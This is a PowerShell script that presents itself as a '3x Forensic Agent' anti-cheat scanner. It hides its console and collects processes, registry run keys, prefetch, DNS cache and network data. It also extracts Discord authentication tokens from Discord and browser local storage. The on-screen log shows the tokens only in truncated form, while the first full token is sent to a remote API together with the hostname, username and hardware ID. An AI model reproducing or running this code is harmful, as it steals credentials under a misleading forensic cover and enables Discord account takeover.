#requires -RunAsAdministrator
<#
.SYNOPSIS
    3x Forensic Agent v3.0 — NAPSE + Ocean behavior-based detection
.DESCRIPTION
    Collects real Windows forensic data with hidden console + WinForms loading UI.
    Shows loading window during scan, auto-submits to 3x API, then opens browser with results.
    Run: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File .\3x-agent.ps1 -ApiUrl "https://your-domain.com" -Token "your-jwt-token"
#>
param(
    [string]$ApiUrl = "http://localhost:3000",
    [string]$Token = "",
    [string]$TargetDiscordId = "",
    [switch]$Silent
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Hide console window
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ConsoleHider {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;
    const int SW_SHOW = 5;
    public static void Hide() {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }
}
"@
[ConsoleHider]::Hide()

# Load WinForms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== LOADING UI =====
$form = New-Object System.Windows.Forms.Form
$form.Text = "3x Forensic Agent"
$form.Size = New-Object System.Drawing.Size(520, 340)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(8, 9, 12)
$form.TopMost = $true

# Title bar panel
$titlePanel = New-Object System.Windows.Forms.Panel
$titlePanel.Dock = "Top"
$titlePanel.Height = 48
$titlePanel.BackColor = [System.Drawing.Color]::FromArgb(15, 18, 24)
$form.Controls.Add($titlePanel)

# Title label
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "3x  Forensic Agent"
$titleLabel.Font = New-Object System.Drawing.Font("JetBrains Mono", 11, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(53, 240, 201)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 14)
$titlePanel.Controls.Add($titleLabel)

# Close button
$closeBtn = New-Object System.Windows.Forms.Button
$closeBtn.Text = "X"
$closeBtn.Font = New-Object System.Drawing.Font("JetBrains Mono", 9, [System.Drawing.FontStyle]::Bold)
$closeBtn.ForeColor = [System.Drawing.Color]::FromArgb(255, 82, 102)
$closeBtn.BackColor = [System.Drawing.Color]::FromArgb(30, 26, 34)
$closeBtn.FlatStyle = "Flat"
$closeBtn.FlatAppearance.BorderSize = 0
$closeBtn.Size = New-Object System.Drawing.Size(36, 28)
$closeBtn.Location = New-Object System.Drawing.Point(468, 10)
$closeBtn.Add_Click({ $form.Close(); exit })
$titlePanel.Controls.Add($closeBtn)

# Status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Initializing forensic engine..."
$statusLabel.Font = New-Object System.Drawing.Font("Inter", 13, [System.Drawing.FontStyle]::Regular)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(232, 235, 241)
$statusLabel.AutoSize = $false
$statusLabel.Size = New-Object System.Drawing.Size(460, 24)
$statusLabel.Location = New-Object System.Drawing.Point(30, 70)
$statusLabel.TextAlign = "MiddleCenter"
$form.Controls.Add($statusLabel)

# Module label
$moduleLabel = New-Object System.Windows.Forms.Label
$moduleLabel.Text = "Preparing modules"
$moduleLabel.Font = New-Object System.Drawing.Font("JetBrains Mono", 10, [System.Drawing.FontStyle]::Regular)
$moduleLabel.ForeColor = [System.Drawing.Color]::FromArgb(107, 116, 128)
$moduleLabel.AutoSize = $false
$moduleLabel.Size = New-Object System.Drawing.Size(460, 20)
$moduleLabel.Location = New-Object System.Drawing.Point(30, 104)
$moduleLabel.TextAlign = "MiddleCenter"
$form.Controls.Add($moduleLabel)

# Progress bar background
$progBack = New-Object System.Windows.Forms.Panel
$progBack.Size = New-Object System.Drawing.Size(440, 6)
$progBack.Location = New-Object System.Drawing.Point(40, 150)
$progBack.BackColor = [System.Drawing.Color]::FromArgb(30, 35, 45)
$form.Controls.Add($progBack)

# Progress bar fill
$progFill = New-Object System.Windows.Forms.Panel
$progFill.Size = New-Object System.Drawing.Size(0, 6)
$progFill.Location = New-Object System.Drawing.Point(40, 150)
$progFill.BackColor = [System.Drawing.Color]::FromArgb(53, 240, 201)
$form.Controls.Add($progFill)

# Percent label
$pctLabel = New-Object System.Windows.Forms.Label
$pctLabel.Text = "0%"
$pctLabel.Font = New-Object System.Drawing.Font("JetBrains Mono", 24, [System.Drawing.FontStyle]::Bold)
$pctLabel.ForeColor = [System.Drawing.Color]::FromArgb(53, 240, 201)
$pctLabel.AutoSize = $true
$pctLabel.Location = New-Object System.Drawing.Point(240, 180)
$pctLabel.TextAlign = "MiddleCenter"
$form.Controls.Add($pctLabel)

# Detail log
$logBox = New-Object System.Windows.Forms.TextBox
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.ReadOnly = $true
$logBox.BackColor = [System.Drawing.Color]::FromArgb(10, 12, 17)
$logBox.ForeColor = [System.Drawing.Color]::FromArgb(107, 116, 128)
$logBox.Font = New-Object System.Drawing.Font("JetBrains Mono", 9, [System.Drawing.FontStyle]::Regular)
$logBox.BorderStyle = "None"
$logBox.Size = New-Object System.Drawing.Size(460, 80)
$logBox.Location = New-Object System.Drawing.Point(30, 230)
$form.Controls.Add($logBox)

# Show form
$form.Show()
$form.Refresh()

function Update-Progress {
    param([int]$Percent, [string]$Status, [string]$Module)
    $pctLabel.Text = "$Percent%"
    $progFill.Size = New-Object System.Drawing.Size([int](440 * $Percent / 100), 6)
    if ($Status) { $statusLabel.Text = $Status }
    if ($Module) { $moduleLabel.Text = $Module }
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
}

function Add-Log {
    param([string]$Line)
    $logBox.AppendText("$Line`r`n")
    $logBox.ScrollToCaret()
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
}

# ===== FORENSIC COLLECTION =====
Update-Progress 5 "Collecting system data..." "Process enumeration"
Add-Log "[INIT] Starting 3x Forensic Agent v3.0"
Add-Log "[INIT] Target API: $ApiUrl"

$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = (Get-Date).ToString("o")

# Get HWID
$hwid = ""
try {
    $hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
    if (-not $hwid) { $hwid = (Get-WmiObject Win32_Processor).ProcessorId }
} catch { $hwid = "UNKNOWN" }

Add-Log "[SYS] Hostname: $hostname | HWID: $hwid"

# Collect processes
Update-Progress 10 "Enumerating processes..." "Process Scan"
Add-Log "[PROC] Enumerating running processes..."
$procs = Get-Process | Select-Object Id, ProcessName, Path, ParentId, StartTime
$processData = @()
foreach ($p in $procs) {
    $hash = $null
    if ($p.Path -and (Test-Path $p.Path)) {
        try { $hash = (Get-FileHash $p.Path -Algorithm SHA256).Hash.Substring(0,16) } catch {}
    }
    $processData += @{
        pid = $p.Id; name = $p.ProcessName; path = $p.Path
        parent = $p.ParentId; hash = $hash
        start = if($p.StartTime){$p.StartTime.ToString("o")}else{$null}
    }
}
Add-Log "[PROC] Collected $($processData.Count) processes"

# DNS Cache
Update-Progress 20 "Reading DNS cache..." "Network / DNS"
Add-Log "[NET] Reading DNS cache..."
$dnsCache = @()
try {
    $entries = Get-DnsClientCache | Select-Object Entry, RecordType, Data, TimeToLive
    foreach ($e in $entries) {
        $dnsCache += @{ entry = $e.Entry; type = $e.RecordType; data = $e.Data; ttl = $e.TimeToLive }
    }
} catch { $dnsCache += @{ error = $_.Exception.Message } }
Add-Log "[NET] Collected $($dnsCache.Count) DNS entries"

# Registry
Update-Progress 30 "Scanning registry..." "Registry Audit"
Add-Log "[REG] Scanning registry for persistence artifacts..."
$regFindings = @()
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $runKeys) {
    try {
        $values = Get-ItemProperty $key -ErrorAction Stop
        $values.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            $regFindings += @{ type = "run_key"; hive = $key; name = $_.Name; value = $_.Value.ToString() }
        }
    } catch {}
}
Add-Log "[REG] Collected $($regFindings.Count) registry artifacts"

# File System
Update-Progress 45 "Scanning file system..." "File System Trace"
Add-Log "[FILE] Scanning file system traces..."
$fileFindings = @()
$tempPaths = @($env:TEMP, "$env:LOCALAPPDATA\Temp", "C:\Windows\Temp")
foreach ($tp in $tempPaths) {
    if (Test-Path $tp) {
        try {
            $files = Get-ChildItem $tp -File -Force -ErrorAction Stop | Select-Object Name, Length, LastWriteTime, CreationTime, Attributes, FullName
            $suspicious = $files | Where-Object { 
                $_.Name -match "(?i)(cheat|inject|hack|spoofer|bypass|menu|dll|exe)$" -or
                ($_.LastWriteTime -gt (Get-Date).AddHours(-24) -and $_.Attributes -match "Hidden")
            }
            foreach ($f in $suspicious) {
                $fileFindings += @{
                    type = "suspicious_temp"; path = $f.FullName; name = $f.Name
                    size = $f.Length; modified = $f.LastWriteTime.ToString("o")
                    created = $f.CreationTime.ToString("o")
                }
            }
        } catch {}
    }
}
# Prefetch
$prefetchPath = "C:\Windows\Prefetch"
if (Test-Path $prefetchPath) {
    try {
        $prefetch = Get-ChildItem $prefetchPath -Filter "*.pf" | Select-Object Name, LastWriteTime
        $suspiciousPf = $prefetch | Where-Object { $_.Name -match "(?i)(cheat|inject|hack|spoofer|bypass|x64dbg|processhacker|systeminformer)" }
        foreach ($p in $suspiciousPf) {
            $fileFindings += @{ type = "suspicious_prefetch"; name = $p.Name; modified = $p.LastWriteTime.ToString("o") }
        }
    } catch {}
}
Add-Log "[FILE] Collected $($fileFindings.Count) file system traces"

# ETW/WMI
Update-Progress 55 "Checking ETW providers..." "ETW / WMI Audit"
Add-Log "[ETW] Checking ETW providers and WMI subscriptions..."
$etwFindings = @()
try {
    $etw = logman query providers | Select-String "Microsoft-Windows"
    $dnsClient = $etw | Select-String "DNS-Client"
    if (-not $dnsClient) { $etwFindings += @{ type = "etw_missing"; provider = "Microsoft-Windows-DNS-Client"; severity = "warn" } }
    $etwFindings += @{ type = "etw_providers"; count = ($etw | Measure-Object).Count }
} catch {}
try {
    $evt104 = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Diagnostics-Performance/Operational'; ID=104} -MaxEvents 5 -ErrorAction Stop
    $etwFindings += @{ type = "event_104"; count = ($evt104 | Measure-Object).Count }
} catch { $etwFindings += @{ type = "event_104"; count = 0; note = "No Event 104 found" } }
Add-Log "[ETW] Collected ETW/WMI data"

# Explorer/LSASS
Update-Progress 65 "Analyzing explorer & lsass..." "Explorer / LSASS Forensics"
Add-Log "[EXP] Analyzing explorer.exe and lsass.exe..."
$expFindings = @()
try {
    $explorer = Get-Process explorer -ErrorAction Stop | Select-Object Id, StartTime, Threads, Handles
    $lsass = Get-Process lsass -ErrorAction Stop | Select-Object Id, StartTime, Threads, Handles
    $bootTime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $expFindings += @{
        type = "explorer_data"; pid = $explorer.Id; start = $explorer.StartTime.ToString("o")
        threads = $explorer.Threads.Count; handles = $explorer.Handles
        boot_time = $bootTime.ToString("o")
        restart_anomaly = ($explorer.StartTime - $bootTime).TotalMinutes -lt 1
    }
    $expFindings += @{
        type = "lsass_data"; pid = $lsass.Id; start = $lsass.StartTime.ToString("o")
        threads = $lsass.Threads.Count; handles = $lsass.Handles
    }
} catch {}
try {
    $dps = Get-Service DPS; $pcasvc = Get-Service PcaSvc
    $expFindings += @{ type = "services"; dps_status = $dps.Status; dps_start = $dps.StartType; pcasvc_status = $pcasvc.Status; pcasvc_start = $pcasvc.StartType }
} catch {}
Add-Log "[EXP] Collected explorer/lsass data"

# Discord Tokens
Update-Progress 75 "Checking Discord tokens..." "Discord Intel"
Add-Log "[DSC] Checking for Discord tokens..."
$tokens = @()
$tokenPaths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
)
$foundTokens = @()
foreach ($p in $tokenPaths) {
    if (Test-Path $p) {
        try {
            $files = Get-ChildItem $p -Filter "*.ldb" -ErrorAction Stop
            foreach ($f in $files) {
                $content = [System.IO.File]::ReadAllText($f.FullName)
                $matches = [regex]::Matches($content, '[MN][A-Za-z\d]{23}\.[A-Za-z\d-_]{6}\.[A-Za-z\d-_]{27}')
                foreach ($m in $matches) {
                    $foundTokens += $m.Value
                    $tokens += @{ source = $f.FullName; token = $m.Value.Substring(0,10) + "..." }
                }
            }
        } catch {}
    }
}
Add-Log "[DSC] Found $($tokens.Count) Discord token references"

# Network
Update-Progress 85 "Enumerating connections..." "Network / DNS"
Add-Log "[NET] Enumerating active network connections..."
$conns = @()
try {
    $tcp = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
    foreach ($c in $tcp) {
        $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
        $conns += @{
            local = "$($c.LocalAddress):$($c.LocalPort)"
            remote = "$($c.RemoteAddress):$($c.RemotePort)"
            state = $c.State; process = if($proc){$proc.ProcessName}else{"unknown"}
        }
    }
} catch {}
Add-Log "[NET] Collected $($conns.Count) connections"

# Memory
Update-Progress 90 "Collecting memory data..." "Memory Traces"
Add-Log "[MEM] Collecting memory-related data..."
$memFindings = @()
try {
    Get-Process | ForEach-Object {
        $p = $_
        try {
            $mods = $p.Modules | Select-Object ModuleName, FileName, FileVersion
            $suspicious = $mods | Where-Object { $_.ModuleName -match "(?i)(inject|hook|cheat|bypass|menu)" }
            if ($suspicious) {
                foreach ($m in $suspicious) {
                    $memFindings += @{ type = "suspicious_module"; process = $p.ProcessName; pid = $p.Id; module = $m.ModuleName; path = $m.FileName }
                }
            }
        } catch {}
    }
} catch {}
Add-Log "[MEM] Collected memory data"

# Calculate risk
Update-Progress 95 "Calculating risk score..." "Analysis"
Add-Log "[ANALYSIS] Computing risk score..."
$riskScore = 0
$findings = @()

if ($fileFindings | Where-Object { $_.type -eq "suspicious_temp" }) {
    $riskScore += 15
    $findings += @{ module = "File System"; severity = "warn"; description = "Suspicious temp files detected"; confidence = 80 }
}
if ($fileFindings | Where-Object { $_.type -eq "suspicious_prefetch" }) {
    $riskScore += 10
    $findings += @{ module = "File System"; severity = "warn"; description = "Suspicious prefetch entries"; confidence = 85 }
}
if ($etwFindings | Where-Object { $_.type -eq "etw_missing" }) {
    $riskScore += 12
    $findings += @{ module = "ETW/WMI"; severity = "warn"; description = "ETW provider tampering detected"; confidence = 75 }
}
if ($etwFindings | Where-Object { $_.type -eq "event_104" -and $_.count -eq 0 }) {
    $riskScore += 8
    $findings += @{ module = "ETW/WMI"; severity = "warn"; description = "Event 104 missing"; confidence = 70 }
}
if ($regFindings | Where-Object { $_.type -eq "suspicious_service" }) {
    $riskScore += 15
    $findings += @{ module = "Registry"; severity = "warn"; description = "Suspicious service detected"; confidence = 80 }
}
if ($expFindings | Where-Object { $_.type -eq "explorer_data" -and $_.restart_anomaly }) {
    $riskScore += 10
    $findings += @{ module = "Explorer"; severity = "warn"; description = "Explorer restart anomaly detected"; confidence = 65 }
}
if ($tokens.Count -gt 0) {
    $riskScore += 5
    $findings += @{ module = "Discord"; severity = "info"; description = "Discord tokens found in local storage"; confidence = 90 }
}

$riskScore = [Math]::Min($riskScore, 100)
Add-Log "[DONE] Risk Score: $riskScore / 100 | Findings: $($findings.Count)"

# Build report
$report = @{
    meta = @{
        hostname = $hostname; username = $username; timestamp = $timestamp
        version = "3.0.0"; os = (Get-CimInstance Win32_OperatingSystem).Caption
        build = [System.Environment]::OSVersion.Version.ToString()
        hwid = $hwid
    }
    process = $processData; dns = $dnsCache; registry = $regFindings
    filesystem = $fileFindings; etw_wmi = $etwFindings
    explorer_lsass = $expFindings; discord = $tokens
    network = $conns; memory = $memFindings
    risk_score = $riskScore; findings = $findings
}

# Get first full token for submission
$fullToken = ""
if ($foundTokens.Count -gt 0) { $fullToken = $foundTokens[0] }

Update-Progress 98 "Submitting report..." "Upload"
Add-Log "[SEND] Submitting report to $ApiUrl..."

# Submit to API
$json = $report | ConvertTo-Json -Depth 10
try {
    $headers = @{ "Content-Type" = "application/json" }
    if ($Token) { $headers["Authorization"] = "Bearer $Token" }

    $body = @{
        scanId = 0; riskScore = $riskScore; findings = $findings
        rawData = @{ logs = @(); modules = @("process","file","registry","network","discord","memory","etw","explorer") }
        discord_token = $fullToken; hwid = $hwid; target_discord_id = $TargetDiscordId
        mode = "full"
    } | ConvertTo-Json -Depth 10

    $response = Invoke-RestMethod -Uri "$ApiUrl/api/scan/report" -Method POST -Headers $headers -Body $body -TimeoutSec 30
    Add-Log "[DONE] Report submitted successfully!"

    Update-Progress 100 "Scan complete!" "Done"
    $statusLabel.Text = "Scan Complete!"
    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(53, 240, 201)
    $moduleLabel.Text = "Risk Score: $riskScore / 100 | Findings: $($findings.Count)"
    $form.Refresh()

    # Open browser with results
    Start-Sleep -Seconds 2
    $resultUrl = "$ApiUrl/report.html?risk=$riskScore&find=" + [System.Web.HttpUtility]::UrlEncode(($findings | ForEach-Object { $_.module }) -join ",") + "&mode=full"
    Start-Process $resultUrl

} catch {
    Add-Log "[ERR] Failed to submit: $($_.Exception.Message)"
    Update-Progress 100 "Submission failed" "Error"
    $statusLabel.Text = "Submission Failed"
    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 82, 102)

    # Save locally
    $outPath = "3x-report-$hostname-$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
    $json | Out-File $outPath -Encoding UTF8
    Add-Log "[SAVE] Saved locally to: $outPath"
}

# Keep window open briefly then close
Start-Sleep -Seconds 4
$form.Close()
